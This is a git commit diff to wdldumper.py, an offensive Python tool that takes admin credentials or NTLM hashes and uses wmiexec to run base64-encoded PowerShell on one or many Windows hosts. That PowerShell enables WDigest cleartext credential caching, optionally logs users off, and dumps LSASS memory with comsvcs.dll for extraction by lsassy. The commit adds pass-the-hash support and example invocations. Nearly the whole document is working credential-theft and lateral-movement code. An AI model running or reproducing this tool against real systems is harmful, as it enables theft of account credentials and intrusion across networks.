6e3358caf4eb7359670e7b0580d342ceaf95fc31
Blazz3 <33965605+Blazz3@users.noreply.github.com>
2019-12-17 23:30:11 -0600

    Update wdldumper.py

--- wdldumper.py
+++ wdldumper.py
@@ -13,20 +13,29 @@ banner = """
 88  8  8 88   8 88    88   8 88  8 88 8  8 88    88   88   8 
 88ee8ee8 88eee8 88eee 88eee8 88ee8 88 8  8 88    88ee 88   8 
 
-by blazz3 @theBlazz3
+by @theBlazz3
 """
 
 if __name__ == "__main__":
     
     print(banner)
     
-    usage = "python3 wdldumper.py -m [wdigest/dump] -d [domain/workgroup] -u [admin] -p [password] -t [IP/targets.txt]"
+    usage = """
+    
+    python3 wdldumper.py -m [wdigest/dump] -d [domain/workgroup] -u [admin] -p [password/LMHASH:NTHASH] -t [IP/targets.txt]
+    
+    examples:
+    
+        python3 wdldumper.py -m wdigest -d evil.corp -u Administrator -p Supers3cret123 -t 192.168.1.12
+        python3 wdldumper.py -m dump -d mydomain.com -u Administrator -p aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 -t targets.txt
+    
+    """
     
     parser = argparse.ArgumentParser(usage=usage)
     parser.add_argument("-m", "--mode", help="wdigest or dump (enable wdigest or perform an lsass dump on target)")
-    parser.add_argument("-d", "--domn", help="domain/workgroup to authenticate")
+    parser.add_argument("-d", "--domn", help="domain/workgroup to authenticate in")
     parser.add_argument("-u", "--user", help="username to authenticate as")
-    parser.add_argument("-p", "--pasw", help="password to authenticate with, leave blank for prompt")
+    parser.add_argument("-p", "--pasw", help="password or hash to authenticate with, leave blank for prompt")
     parser.add_argument("-t", "--targ", help="target ip or list of targets")
     args = parser.parse_args()
     
@@ -60,15 +69,24 @@ if __name__ == "__main__":
         
     if args.mode == "wdigest":
         
+        #ps_command_enable_wdigest = Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
+        ps_command_enable_wdigest = "\"powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiAA==\""
+        
+        #ps_command_enable_wdigest_logout = Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"; $a = ((quser) -replace '^>', '') -replace '\s{2,}', ',' | ConvertFrom-Csv; logoff $a.id
+        ps_command_enable_wdigest_logout = "\"powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiADsAIAAkAGEAIAA9ACAAKAAoAHEAdQBzAGUAcgApACAALQByAGUAcABsAGEAYwBlACAAJwBeAD4AJwAsACAAJwAnACkAIAAtAHIAZQBwAGwAYQBjAGUAIAAnAFwAcwB7ADIALAB9ACcALAAgACcALAAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEMAcwB2ADsAIABsAG8AZwBvAGYAZgAgACQAYQAuAGkAZAA=\""
+                    
         yes = set(['yes', 'y', 'Yes', 'Y'])
         no = set(['no', 'n', 'No', 'N'])
 
-        answer = input("Do you want to log out the system after enabling WDigest? (y/n)\n")
+        answer = input("Do you want to log out the system after enabling WDigest? (y/n)\n")        
         
         if answer in yes:
             if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", args.targ)):
-                #Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"; $a = ((quser) -replace '^>', '') -replace '\s{2,}', ',' | ConvertFrom-Csv; logoff $a.id
-                command = 'wmiexec.py {}/{}:{}@{} "powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiADsAIAAkAGEAIAA9ACAAKAAoAHEAdQBzAGUAcgApACAALQByAGUAcABsAGEAYwBlACAAJwBeAD4AJwAsACAAJwAnACkAIAAtAHIAZQBwAGwAYQBjAGUAIAAnAFwAcwB7ADIALAB9ACcALAAgACcALAAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEMAcwB2ADsAIABsAG8AZwBvAGYAZgAgACQAYQAuAGkAZAA="'.format(args.domn, args.user, args.pasw, args.targ)
+                if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                    wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, args.targ)
+                else:
+                    wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, args.targ)
+                command = wmi_command + ps_command_enable_wdigest_logout
                 command_output = subprocess.check_output(command, shell=True)
                 command_output = command_output.decode("utf-8")
                 if "Completed" in command_output:
@@ -80,8 +98,11 @@ if __name__ == "__main__":
                 f = open(args.targ, 'r').read().split('\n')
                 for ip in f:
                     if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip)):
-                        #Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"; $a = ((quser) -replace '^>', '') -replace '\s{2,}', ',' | ConvertFrom-Csv; logoff $a.id
-                        command = 'wmiexec.py {}/{}:{}@{} "powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiADsAIAAkAGEAIAA9ACAAKAAoAHEAdQBzAGUAcgApACAALQByAGUAcABsAGEAYwBlACAAJwBeAD4AJwAsACAAJwAnACkAIAAtAHIAZQBwAGwAYQBjAGUAIAAnAFwAcwB7ADIALAB9ACcALAAgACcALAAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEMAcwB2ADsAIABsAG8AZwBvAGYAZgAgACQAYQAuAGkAZAA="'.format(args.domn, args.user, args.pasw, ip)
+                        if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                            wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, ip)
+                        else:
+                            wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, ip)
+                        command = wmi_command + ps_command_enable_wdigest_logout
                         command_output = subprocess.check_output(command, shell=True)
                         command_output = command_output.decode("utf-8")
                         if "Completed" in command_output:
@@ -95,8 +116,11 @@ if __name__ == "__main__":
                         sys.exit()
         elif answer in no:
             if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", args.targ)):
-                #Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
-                command = 'wmiexec.py {}/{}:{}@{} "powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiAA=="'.format(args.domn, args.user, args.pasw, args.targ)
+                if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                    wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, args.targ)
+                else:
+                    wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, args.targ)
+                command = wmi_command + ps_command_enable_wdigest
                 command_output = subprocess.check_output(command, shell=True)
                 command_output = command_output.decode("utf-8")
                 if "Completed" in command_output:
@@ -108,8 +132,11 @@ if __name__ == "__main__":
                 f = open(args.targ, 'r').read().split('\n')
                 for ip in f:
                     if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip)):
-                        #Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
-                        command = 'wmiexec.py {}/{}:{}@{} "powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiAA=="'.format(args.domn, args.user, args.pasw, ip)
+                        if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                            wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, ip)
+                        else:
+                            wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, ip)
+                        command = wmi_command + ps_command_enable_wdigest
                         command_output = subprocess.check_output(command, shell=True)
                         command_output = command_output.decode("utf-8")
                         if "Completed" in command_output:
@@ -126,10 +153,20 @@ if __name__ == "__main__":
             sys.exit()
 
     elif args.mode == "dump":
+        
+        #powershell -c "rundll32 comsvcs.dll, MiniDump (get-process lsass).id C:\Windows\Temp\dump.bin full"
+        ps_command_dump = "\"powershell.exe -exec bypass -enc cgB1AG4AZABsAGwAMwAyACAAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwApAC4AaQBkACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABkAHUAbQBwAC4AYgBpAG4AIABmAHUAbABsAA==\""
+        
         if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", args.targ)):
-            #powershell -c "rundll32 comsvcs.dll, MiniDump (get-process lsass).id C:\Windows\Temp\dump.bin full"
-            command1 = 'wmiexec.py {}/{}:{}@{} "powershell.exe -exec bypass -enc cgB1AG4AZABsAGwAMwAyACAAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwApAC4AaQBkACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABkAHUAbQBwAC4AYgBpAG4AIABmAHUAbABsAA=="'.format(args.domn, args.user, args.pasw, args.targ)
-            command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, args.targ)
+            if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, args.targ)
+            else:
+                wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, args.targ)
+            command1 = wmi_command + ps_command_dump
+            if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, args.targ)
+            else:
+                command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, args.targ)            
             command_output = subprocess.check_output(command1, shell=True)
             command_output = command_output.decode("utf-8")
             if "Completed" in command_output:
@@ -148,9 +185,15 @@ if __name__ == "__main__":
             f = open(args.targ, 'r').read().split('\n')
             for ip in f:
                 if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip)):
-                    #powershell -c "rundll32 comsvcs.dll, MiniDump (get-process lsass).id C:\Windows\Temp\dump.bin full"
-                    command1 = 'wmiexec.py {}/{}:{}@{} "powershell.exe -exec bypass -enc cgB1AG4AZABsAGwAMwAyACAAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwApAC4AaQBkACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABkAHUAbQBwAC4AYgBpAG4AIABmAHUAbABsAA=="'.format(args.domn, args.user, args.pasw, ip)
-                    command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, ip)
+                    if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                        wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, ip)
+                    else:
+                        wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, ip)
+                    command1 = wmi_command + ps_command_dump
+                    if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
+                        command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, ip)
+                    else:
+                        command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, ip)
                     command_output = subprocess.check_output(command1, shell=True)
                     command_output = command_output.decode("utf-8")
                     if "Completed" in command_output:
